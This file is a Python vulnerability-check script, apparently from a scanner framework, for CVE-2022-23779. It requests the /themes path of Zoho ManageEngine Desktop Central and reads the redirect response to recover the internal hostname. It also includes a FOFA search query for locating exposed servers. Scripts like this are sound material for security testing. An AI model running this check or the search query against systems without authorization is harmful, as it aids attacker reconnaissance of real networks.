import requests
import re


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Zoho ManageEngine - Internal Hostname Disclosure''',
        "description": '''Zoho ManageEngine Desktop Central before 10.1.2137.8 exposes the installed server name to anyone. The internal hostname can be discovered by reading HTTP redirect responses.''',
        "severity": "medium",
        "references": [
            "https://www.manageengine.com/products/desktop-central/cve-2022-23779.html", 
            "https://github.com/fbusr/CVE-2022-23779", 
            "https://nvd.nist.gov/vuln/detail/CVE-2022-23779"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "cvss-score": "5.3",
            "cve-id": "CVE-2022-23779",
            "cwe-id": "CWE-200"
        },
        "metadata":{
            "vuln-target": "",
            "fofa-query":'''app="ZOHO-ManageEngine-Desktop"''',
        },
        "tags": ["zoho", "exposure"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = "/themes"
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',}
        resp = requests.get(url=url+path,headers=headers,timeout=10,verify=False,allow_redirects=False)
        tmp = re.findall(r"https?:\/\/(.*):", resp.text)
        if tmp:
            host = tmp[0]
        else:
            return result

        if resp.status_code == 301 and "/themes/" in str(resp.headers) and "text/html" in str(resp.headers) and host not in resp.headers["location"]:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url